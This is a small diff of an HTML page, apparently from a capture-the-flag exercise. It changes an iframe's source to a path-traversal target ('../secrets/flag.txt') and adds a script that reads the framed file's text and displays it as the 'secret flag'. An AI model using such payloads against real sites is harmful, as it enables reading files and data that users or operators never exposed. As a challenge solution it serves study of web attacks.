@@ -4,7 +4,7 @@
 <body>
 <br><BR><BR><BR>
 <h1>pwn<br>
-<iframe onload=j() src="flag.txt">xssxsxxsxs</iframe>
+<iframe onload=j() src="../secrets/flag.txt">xssxsxxsxs</iframe>
 <script type="text/javascript">
     function j(){alert('The secret flag is:\n\n '+frames[0].document.body.innerText)}
 </script>
